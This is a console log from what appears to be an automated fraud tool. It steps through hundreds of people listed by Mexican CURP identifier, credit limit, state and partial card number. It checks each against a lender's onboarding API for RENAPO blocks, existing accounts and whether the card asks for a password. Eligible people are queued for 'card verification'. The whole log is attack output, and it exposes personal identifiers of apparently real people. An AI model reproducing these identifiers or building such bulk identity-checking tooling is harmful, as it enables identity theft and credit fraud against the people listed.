[736] ID:4883427 | SAME700818MMNLRL00 | $196,000 | MICHOACAN | T:8986... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.7s)
[737] ID:4890287 | JICA690621HCGMHL07 | $196,000 | COAHUILA | T:9455... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.5s)
[738] ID:312737 | GOMC740822HBSNRS08 | $195,920 | BAJA CALIFOR | T:5229... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[739] ID:3891577 | OERM720125HDFLNG02 | $195,900 | CIUDAD DE ME | T:0016... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[740] ID:1416772 | HEAJ730427HJCRGN03 | $195,850 | JALISCO | T:0366... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[741] ID:2831157 | VEVA000101HCHGGNA9 | $195,840 | CHIHUAHUA | T:6708... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[742] ID:1967518 | IARV750711MMCBYR08 | $195,800 | ESTADO DE ME | T:7991... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.0s)
[743] ID:105055 | HOSI700210MDFYNN02 | $195,750 | CIUDAD DE ME | T:1713... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[744] ID:251057 | OEGJ700403HTSLNN06 | $195,750 | TAMAULIPAS | T:1076... [🔴 OFF] Contacto preexistente (/confirm-contact) (11.0s)
[745] ID:1312443 | CAME740916MSOSDG05 | $195,750 | SINALOA | T:3606... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[746] ID:3110282 | GUMC700612HDFTJM02 | $195,750 | CIUDAD DE ME | T:4441... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[747] ID:882359 | EIRO740603HMCSMS04 | $195,630 | ESTADO DE ME | T:4934... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[748] ID:3912362 | HEAJ730427HJCRGN03 | $195,600 | JALISCO | T:2992... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[749] ID:3567311 | EAEJ760510HNLSSV08 | $195,580 | NUEVO LEON | T:8915... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[750] ID:2953018 | CEMR740110HQTSRC05 | $195,570 | QUERETARO | T:8502... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[751] ID:2943864 | ROGJ691007HNLMNR05 | $195,530 | NUEVO LEON | T:1916... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[752] ID:7989 | LOSF720815HCGPLR07 | $195,490 | COAHUILA | T:7473... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[753] ID:4321893 | VILG710919HDFLNN08 | $195,470 | CIUDAD DE ME | T:7746... [🔴 OFF] Rechazo bancario (PE1002) (12.3s)
[754] ID:1527648 | MAVR690907MMNCGS00 | $195,430 | MICHOACAN | T:1719... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7746 para ID:4321893 ($195,470)... [755] ID:2341547 | AAMO700221HDFLCS07 | $195,400 | CIUDAD DE ME | T:2918... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[756] ID:1081665 | AAAG690824HDFRLL01 | $195,390 | CIUDAD DE ME | T:8608... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[757] ID:2638886 | EAFV760204HJCSLN05 | $195,370 | JALISCO | T:6030... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[758] ID:1738064 | GUMT810424MJCTGH02 | $195,330 | JALISCO | T:6594... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2918 para ID:2341547 ($195,400)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[759] ID:4450904 | LEAM700918MNLLLR09 | $195,320 | NUEVO LEON | T:0003... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[760] ID:86923 | TIAR750815HSORBB02 | $195,310 | SINALOA | T:5128... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[761] ID:1282291 | VERC710522HJCLSR08 | $195,300 | JALISCO | T:2179... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.2s)
[762] ID:1539287 | CABF780625HSPMRR09 | $195,300 | SAN LUIS POT | T:0714... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[763] ID:3233261 | RUAF750919HGTZLR05 | $195,300 | GUANAJUATO | T:2569... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.5s)
[764] ID:4743803 | RURL710625HCSZBC00 | $195,300 | CHIAPAS | T:5346... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0714 para ID:1539287 ($195,300)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE150) (14.6s)
[765] ID:2805080 | OIMA730816MDFLRN00 | $195,260 | CIUDAD DE ME | T:6040... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[766] ID:1087510 | OEHL690427HGTRRS00 | $195,250 | GUANAJUATO | T:5745... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.7s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.6s)
[767] ID:777814 | NEVF710423HJCVZR00 | $195,220 | JALISCO | T:3144... [768] ID:2378138 | MOSM710510HJCRRR02 | $195,200 | JALISCO | T:7587... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5745 para ID:1087510 ($195,250)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[769] ID:4066106 | MAHJ720821HCMRRN03 | $195,200 | COLIMA | T:7494... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[770] ID:190785 | RICR720313HCGVBL01 | $195,150 | COAHUILA | T:6488... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[771] ID:3451211 | BUGJ740525HDFNTS05 | $195,140 | CIUDAD DE ME | T:5323... [🔴 OFF] Rechazo bancario (PE170) (15.5s)
[🔴 OFF] Rechazo bancario (PE1002) (12.1s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[772] ID:2461191 | ZAQR750612HBCMNB03 | $195,070 | BAJA CALIFOR | T:1852... [773] ID:3909058 | AALD770128MSONPL06 | $195,060 | SINALOA | T:6509... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[774] ID:7415 | COPA720809HASNRD04 | $195,020 | AGUASCALIENT | T:2811... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[775] ID:2530976 | GABR750101HNLRRB05 | $195,010 | NUEVO LEON | T:3898... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[776] ID:42541 | EIMC710426MSPSRY04 | $195,000 | SAN LUIS POT | T:7817... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2811 para ID:7415 ($195,020)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[777] ID:418962 | SELM691124HNLNZR08 | $195,000 | NUEVO LEON | T:6238... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[778] ID:1218849 | ROPM700326HNLDNR06 | $195,000 | NUEVO LEON | T:3076... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[779] ID:1410780 | FORD691114HNLLDG04 | $195,000 | NUEVO LEON | T:9890... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[780] ID:1478149 | MAAG690820HTSDLN07 | $195,000 | TAMAULIPAS | T:9933... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.5s)
[781] ID:1703785 | RIGJ771230HNLVMV09 | $195,000 | NUEVO LEON | T:2992... [🔴 OFF] Contacto preexistente (/confirm-contact) (17.7s)
[782] ID:1753879 | MAMC740713MCHLRT09 | $195,000 | CHIHUAHUA | T:5416... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.7s)
[783] ID:1874574 | GOAG700622HMNNVL01 | $195,000 | MICHOACAN | T:0394... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[784] ID:2095724 | PESR730923HSORMB07 | $195,000 | SONORA | T:3534... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[785] ID:2225595 | VAYJ760514HDFRNR09 | $195,000 | CIUDAD DE ME | T:5152... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[786] ID:2314417 | IULS690612HBCTNR02 | $195,000 | BAJA CALIFOR | T:4324... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[787] ID:2430869 | QUTM731106MSONPR01 | $195,000 | SINALOA | T:9149... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[788] ID:2474663 | CEMI720803MCMRJR03 | $195,000 | COLIMA | T:6541... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[789] ID:2665330 | GAVL790222HNLRLS06 | $195,000 | NUEVO LEON | T:0524... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[790] ID:2694436 | LOGA760606MGTPRD06 | $195,000 | GUANAJUATO | T:4740... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6541 para ID:2474663 ($195,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.3s)
[791] ID:2785172 | VAPG690317HDFLRL04 | $195,000 | CIUDAD DE ME | T:5018... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.1s)
[792] ID:2791699 | WOCG700211HMCNHL02 | $195,000 | ESTADO DE ME | T:3416... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0524 para ID:2665330 ($195,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[793] ID:2804977 | AALD770128MSONPL06 | $195,000 | SINALOA | T:5569... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[794] ID:2912862 | GUCL740702HQTSMS08 | $195,000 | QUERETARO | T:6563... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[795] ID:3273624 | GACC730612HJCRMR06 | $195,000 | JALISCO | T:0932... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.8s)
[796] ID:3603565 | GUCG750929HNLJNB07 | $195,000 | NUEVO LEON | T:0062... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4740 para ID:2694436 ($195,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.8s)
[797] ID:3738895 | LACJ770614HNLSBM06 | $195,000 | NUEVO LEON | T:0289... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[798] ID:3826611 | CABC711125HVZRRT01 | $195,000 | VERACRUZ | T:5173... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[799] ID:3934186 | AAPE741022HJCLRD07 | $195,000 | JALISCO | T:1288... [🔴 OFF] Rechazo bancario (PE170) (14.0s)
[800] ID:4316038 | DIJA740614HMSMRN09 | $195,000 | MORELOS | T:0376... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[801] ID:4612456 | CATR690925HCPJRF01 | $195,000 | CAMPECHE | T:9979... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[802] ID:4702324 | TICA691013HGRRSL07 | $195,000 | GUERRERO | T:6939... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[803] ID:4814947 | ROCR701017HGTMRB03 | $195,000 | GUANAJUATO | T:2096... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[804] ID:1437139 | RUNR790827MJCZVC00 | $194,990 | JALISCO | T:0110... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.9s)
[805] ID:3863495 | ROSL701018MDFSNC00 | $194,990 | CIUDAD DE ME | T:6012... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2096 para ID:4814947 ($195,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.3s)
[806] ID:2871206 | OIIA700421HMCRTL00 | $194,960 | ESTADO DE ME | T:3656... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[807] ID:1923939 | LIGJ731112MSOZRS09 | $194,940 | SINALOA | T:4014... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.6s)
[808] ID:1852863 | CABG730430HMCHRL05 | $194,930 | ESTADO DE ME | T:3176... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[809] ID:1648966 | VELA720122HBSGNN09 | $194,920 | BAJA CALIFOR | T:4388... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[810] ID:2728889 | MIPJ731226HYCLNN03 | $194,920 | YUCATAN | T:3720... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[811] ID:3062136 | EIRV700411HDFSST05 | $194,920 | CIUDAD DE ME | T:6760... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[812] ID:2338825 | MAMA010101HBCCMRA2 | $194,870 | BAJA CALIFOR | T:3473... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[813] ID:1808408 | OIHS780305MCHRRJ06 | $194,850 | CHIHUAHUA | T:1435... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[814] ID:2075592 | NAVF750628HMCVLR08 | $194,800 | ESTADO DE ME | T:6012... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.0s)
[815] ID:2884578 | LOGS770206HNLPNT06 | $194,790 | NUEVO LEON | T:6856... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[816] ID:2338323 | CURO010101HDFRNDA3 | $194,750 | CIUDAD DE ME | T:6867... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[817] ID:4099796 | HECR760120HSORVC04 | $194,740 | SINALOA | T:0570... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[818] ID:2381360 | RECG711031HMCYBR09 | $194,690 | ESTADO DE ME | T:7318... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[819] ID:2294970 | TEVJ690816HHGRRS02 | $194,680 | HIDALGO | T:4500... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[820] ID:1276341 | BACL721006HDFSSS00 | $194,670 | CIUDAD DE ME | T:2842... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.3s)
[821] ID:4679502 | ROGE731128HNLDRD04 | $194,600 | NUEVO LEON | T:1226... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4500 para ID:2294970 ($194,680)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[822] ID:165115 | VAZG000101HVZLMRA5 | $194,470 | VERACRUZ | T:2991... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[823] ID:2916702 | NAJU690618HDFVFL08 | $194,460 | CIUDAD DE ME | T:8592... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[824] ID:4069378 | MOGJ701201HMCRRV07 | $194,450 | ESTADO DE ME | T:1985... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.2s)
[825] ID:1697853 | HEFL701118HNLRJN00 | $194,440 | NUEVO LEON | T:3329... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1226 para ID:4679502 ($194,600)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[826] ID:1187825 | EEFE010101HMCSLRA2 | $194,400 | ESTADO DE ME | T:9201... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[827] ID:3862567 | EOCR711120HJCSBC01 | $194,400 | JALISCO | T:2297... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[828] ID:3937234 | GUAJ740101HVRTLV02 | $194,400 | VERACRUZ | T:4829... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[829] ID:4093442 | CAOC700613MGTSRL05 | $194,400 | GUANAJUATO | T:7700... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[830] ID:4204555 | CAMJ710323HVRRLN05 | $194,400 | VERACRUZ | T:2448... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.1s)
[831] ID:4280725 | AAVF700623HASNRR01 | $194,400 | AGUASCALIENT | T:7249... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2297 para ID:3862567 ($194,400)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[832] ID:1889663 | TEOG740930HGTNRR04 | $194,370 | GUANAJUATO | T:1202... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[833] ID:1064607 | ROMD720123MDFSNR04 | $194,300 | CIUDAD DE ME | T:5146... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[834] ID:1808795 | OEAM700929HMCRLG00 | $194,300 | ESTADO DE ME | T:8944... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.5s)
[835] ID:2682720 | CAJO750901HMCBSL08 | $194,300 | ESTADO DE ME | T:0051... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[836] ID:694584 | CEAC760721HVRDVR09 | $194,290 | VERACRUZ | T:0453... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[837] ID:2687362 | AURJ710521HQRNMN00 | $194,290 | QUINTANA ROO | T:6672... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8944 para ID:1808795 ($194,300)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[838] ID:1731803 | MALI720214HMCYCS04 | $194,270 | ESTADO DE ME | T:1601... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[839] ID:2652751 | CAAH710208MCHMNL07 | $194,250 | CHIHUAHUA | T:7643... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[840] ID:3640393 | VINJ690228MSPLYC04 | $194,240 | SAN LUIS POT | T:0445... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[841] ID:700261 | RUAA691017HJCBLL00 | $194,230 | JALISCO | T:2078... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.1s)
[842] ID:1645477 | SADJ690415HSONVR09 | $194,220 | SINALOA | T:2436... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[843] ID:3639690 | LOGS701021HDFPNR04 | $194,220 | CIUDAD DE ME | T:0012... [844] ID:1274467 | PAOA710525MJCLRD04 | $194,210 | JALISCO | T:6724... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.4s)
[845] ID:4666432 | MASI010101MGRTRLA6 | $194,210 | GUERRERO | T:7222... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.7s)
[846] ID:3229248 | CEAC760721HVRDVR09 | $194,200 | VERACRUZ | T:3533... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6724 para ID:1274467 ($194,210)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[847] ID:205784 | RUAA691017HJCBLL00 | $194,180 | JALISCO | T:5490... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[848] ID:4024550 | LERD720523HVRNDV04 | $194,170 | VERACRUZ | T:8166... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[849] ID:1809394 | GOLA690912HNLNLL08 | $194,120 | NUEVO LEON | T:1256... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[850] ID:3019615 | REGA831021MJCGTN00 | $194,090 | JALISCO | T:2670... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[851] ID:3399549 | CAEJ760421HMCHSR09 | $194,090 | ESTADO DE ME | T:6327... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[852] ID:231423 | AUGV730220HJCNNC04 | $194,050 | JALISCO | T:1388... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.4s)
[853] ID:329705 | VINJ690228MSPLYC04 | $194,040 | SAN LUIS POT | T:5231... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2670 para ID:3019615 ($194,090)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[854] ID:1647387 | NABB750911MDFGCL06 | $194,040 | CIUDAD DE ME | T:2401... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[855] ID:3916169 | TEMM691201HASCRG06 | $194,040 | AGUASCALIENT | T:9101... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2401 para ID:1647387 ($194,040)... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[856] ID:428803 | ROAE720408HJCDGM05 | $194,010 | JALISCO | T:5850... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[857] ID:448433 | GOCL740820HGTMHS09 | $194,000 | GUANAJUATO | T:9879... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[858] ID:793391 | ROCA790221MMCJLD03 | $194,000 | ESTADO DE ME | T:9456... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.3s)
[859] ID:905959 | CAAC700701MDGRVC03 | $194,000 | DURANGO | T:1814... [🔴 OFF] Rechazo bancario (PE170) (17.8s)
[860] ID:912687 | LOMD690107MASPRR09 | $194,000 | AGUASCALIENT | T:1283... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[861] ID:947367 | MEDM710211MMSNLR09 | $194,000 | MORELOS | T:0622... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[862] ID:951276 | PARS711005MGTZNN02 | $194,000 | GUANAJUATO | T:2835... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[863] ID:981883 | MAAA700316HDFZLL05 | $194,000 | CIUDAD DE ME | T:7148... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[864] ID:1289685 | JIBC700330HDFMRR02 | $194,000 | CIUDAD DE ME | T:5489... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7148 para ID:981883 ($194,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (17.3s)
[865] ID:1297859 | OIMJ800319MCHLRS05 | $194,000 | CHIHUAHUA | T:5419... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[866] ID:1562400 | TISG690419HCGRRR02 | $194,000 | COAHUILA | T:4664... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2835 para ID:951276 ($194,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[867] ID:1631436 | VAZB700515MGRLVT06 | $194,000 | GUERRERO | T:2496... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (17.8s)
[868] ID:2255900 | FEIR690829HSOLBL03 | $194,000 | SONORA | T:0814... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5419 para ID:1297859 ($194,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.0s)
[869] ID:2492205 | RERG690514HVRYMB04 | $194,000 | VERACRUZ | T:9335... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[870] ID:2750753 | AUMS800121HJCGCN06 | $194,000 | JALISCO | T:2998... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[871] ID:2850102 | IAAN691126HPLBMX04 | $194,000 | PUEBLA | T:5874... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[872] ID:3007830 | LIGM790310MCHCTR06 | $194,000 | CHIHUAHUA | T:9237... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2496 para ID:1631436 ($194,000)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[873] ID:3093984 | PEBR691003HMCRNB01 | $194,000 | ESTADO DE ME | T:1071... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[874] ID:3132587 | KAIA771116HCHNSL00 | $194,000 | CHIHUAHUA | T:3923... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5874 para ID:2850102 ($194,000)... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[875] ID:3397385 | VAZC721007HMCZVR05 | $194,000 | ESTADO DE ME | T:1249... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[876] ID:3761703 | SASI700518HNLLGG09 | $194,000 | NUEVO LEON | T:7218... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.5s)
[877] ID:3814520 | CUFF700619HSPRRR06 | $194,000 | SAN LUIS POT | T:8666... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3923 para ID:3132587 ($194,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[878] ID:3960652 | RAMC710701HBSNRL00 | $194,000 | BAJA CALIFOR | T:8197... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.1s)
[879] ID:4411959 | AEPF710729HMCCDR04 | $194,000 | ESTADO DE ME | T:9716... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[880] ID:2071282 | RALA690209HDFBMB03 | $193,980 | CIUDAD DE ME | T:1840... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[881] ID:1797132 | PEGL700528MCPRMR00 | $193,950 | CAMPECHE | T:3551... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[882] ID:4135538 | MISY730814MCHRNZ06 | $193,950 | CHIHUAHUA | T:1907... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[883] ID:2918268 | IAHH701016HNTBRC05 | $193,940 | NAYARIT | T:1736... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.5s)
[884] ID:2334988 | LOMM720225HDFPLR09 | $193,930 | CIUDAD DE ME | T:6375... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[885] ID:2060301 | MEOM741216HJCNRR06 | $193,910 | JALISCO | T:2414... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
